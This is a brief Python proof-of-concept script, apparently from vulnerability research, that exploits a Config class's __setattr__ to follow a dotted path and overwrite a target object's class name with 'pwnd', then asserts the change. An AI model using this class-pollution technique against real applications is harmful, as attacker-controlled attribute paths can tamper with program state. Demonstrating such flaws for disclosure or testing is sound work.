# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: Config.__setattr__
# Type: get-attr-set-attr

from local_utils.config_utils.parse_config_utils import Config

class Target: pass
target = Target()

cfg = Config()
cfg["target"] = target

payload_value = "pwnd"
PAYLOAD = "target.__class__.__name__"

def run_poc():
  cfg.__setattr__(PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
